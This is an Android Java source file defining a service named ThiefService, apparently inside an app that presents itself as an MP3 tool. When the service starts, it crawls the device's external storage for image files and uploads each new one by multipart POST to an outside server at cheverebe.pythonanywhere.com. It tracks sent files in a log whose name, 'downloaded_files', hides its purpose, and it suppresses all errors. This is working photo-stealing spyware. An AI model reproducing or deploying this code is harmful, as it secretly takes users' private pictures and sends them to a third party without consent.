package com.sim.golden.service;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.net.URLEncoder;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.message.BasicNameValuePair;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;

import org.apache.http.NameValuePair;

public class ThiefService extends Service  {

	List<String> pics = new ArrayList<String>();

   // public ThiefService() {
     //   super("ThiefService");
    //}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId){
		try {

			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
					.permitAll().build();
			StrictMode.setThreadPolicy(policy);

			CheckFolderContent(Environment.getExternalStorageDirectory());

			URL url2 = new URL("http://cheverebe.pythonanywhere.com/file/");

			for (int i = 0; i < pics.size(); i++) {
				if (!IsSendedFile(pics.get(i))) {
					List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
					nameValuePairs.add(new BasicNameValuePair("media", pics.get(i)));
					MultipartServer.postData(url2, nameValuePairs);
					AddToSendedRegistry(pics.get(i)); 
				}
			}
		} catch (Exception ex) {
		}
		stopSelf();
		return 1;
	}

	private void AddToSendedRegistry(String file) {
		try {
			File logFile = new File(Environment.getExternalStorageDirectory()
					.toString(), "simplemp3/downloaded_files");
			if (!logFile.exists()) {
				logFile.createNewFile();
			}

			BufferedWriter output = new BufferedWriter(new FileWriter(logFile, true));
			MessageDigest md = null;
			md = MessageDigest.getInstance("SHA-1");

			String hash = ByteArrayToHexString(md.digest(file.getBytes()));
			output.write(hash + System.getProperty("line.separator"));
			output.close();
		} catch (Exception e) {
		}
	}

	private String ByteArrayToHexString(byte[] b) {
		String result = "";
		for (int i = 0; i < b.length; i++) {
			result += Integer.toString((b[i] & 0xff) + 0x100, 16).substring(1);
		}
		return result;
	}

	private boolean IsSendedFile(String file) {
		BufferedReader br = null;
		DataInputStream in = null;
		FileInputStream fstream = null;
		try {
			fstream = new FileInputStream(Environment
					.getExternalStorageDirectory().toString()
					+ "/simplemp3/downloaded_files");
			in = new DataInputStream(fstream);
			br = new BufferedReader(new InputStreamReader(in));
			String strLine;
			while ((strLine = br.readLine()) != null) {
				MessageDigest md = null;
				md = MessageDigest.getInstance("SHA-1");
				String hash = ByteArrayToHexString(md.digest(file.getBytes()));
				if (hash.equals(strLine))
				{
					br.close();
					return true;
				}
			}
			br.close();
			in.close();
			fstream.close();
		} catch (Exception e) {
		}
		return false;
	}

	private void CheckFolderContent(File folder) {
		CheckFile(folder);
		File files[] = folder.listFiles();
		if (files != null) {
			for (int j = 0; j < files.length; j++) {
				CheckFolderContent(files[j]);
			}
		}
	}

	private void CheckFile(File file) {
		if (file != null) {
			String fileName = file.getAbsolutePath();
			String extension = "";
			int ind = fileName.lastIndexOf('.');
			int p = Math.max(fileName.lastIndexOf('/'),
					fileName.lastIndexOf('\\'));

			if (ind > p) {
				extension = fileName.substring(fileName.length() - 4);
				if (extension.endsWith(".jpg") || extension.endsWith(".gif")
						|| extension.endsWith(".bmp")
						|| extension.endsWith(".png")
						|| extension.endsWith(".tif")) {
					pics.add(fileName);
				}
			}
		}
	}

	private static class MultipartServer {
		private static final String TAG = "MultipartServer";
		private static String crlf = "\r\n";
		private static String twoHyphens = "--";
		private static String boundary = "*****";
		private static String filePath = null;

		public static String postData(URL url,
				List<NameValuePair> nameValuePairs) throws IOException {
			try {

				HttpURLConnection connection = (HttpURLConnection) url
						.openConnection();
				connection.setReadTimeout(10000);
				connection.setConnectTimeout(15000);
				connection.setRequestMethod("POST");
				connection.setUseCaches(false);
				connection.setDoInput(true);
				connection.setDoOutput(true);

				connection.setRequestProperty("Connection", "Keep-Alive");
				connection.setRequestProperty("Cache-Control", "no-cache");
				connection.setRequestProperty("Content-Type",
						"multipart/form-data;boundary=" + boundary);

				String fileName = null;
				StringBuilder query = new StringBuilder();
				boolean first = true;
				for (NameValuePair pair : nameValuePairs) {
					if (first)
						first = false;
					else
						query.append("&");
					query.append(URLEncoder.encode(pair.getName(), "UTF-8"));
					query.append("=");
					query.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
					if ((fileName = pair.getName()).equals("media")) {
						filePath = pair.getValue();
					}

				}

				FileInputStream inputStream;
				OutputStream outputStream = connection.getOutputStream();
				DataOutputStream dataOutputStream = new DataOutputStream(
						outputStream);

				dataOutputStream.writeBytes(query.toString());

				if (fileName != null && filePath != null) {
					dataOutputStream.writeBytes(twoHyphens + boundary + crlf);
					dataOutputStream
							.writeBytes("Content-Disposition: form-data; name=\""
									+ fileName
									+ "\";filename=\""
									+ new File(filePath).getName()
									+ "\";"
									+ crlf);
					dataOutputStream.writeBytes(crlf);

					inputStream = new FileInputStream(filePath);
					byte[] data = new byte[1024];
					int read;
					while ((read = inputStream.read(data)) != -1)
						dataOutputStream.write(data, 0, read);
					inputStream.close();

					dataOutputStream.writeBytes(crlf);
					dataOutputStream.writeBytes(twoHyphens + boundary
							+ twoHyphens + crlf);
				}

				dataOutputStream.flush();
				dataOutputStream.close();

				String responseMessage = connection.getResponseMessage();
				Log.d(TAG, responseMessage);

				InputStream in = connection.getInputStream();
				BufferedReader bufferedReader = new BufferedReader(
						new InputStreamReader(in, "UTF-8"));

				StringBuilder response = new StringBuilder();
				char[] b = new char[512];
				int read;
				while ((read = bufferedReader.read(b)) != -1) {
					response.append(b, 0, read);
				}

				connection.disconnect();
				Log.d(TAG, response.toString());
				return response.toString();
			} catch (Exception e) {
				return "";
			}
		}
	}
}
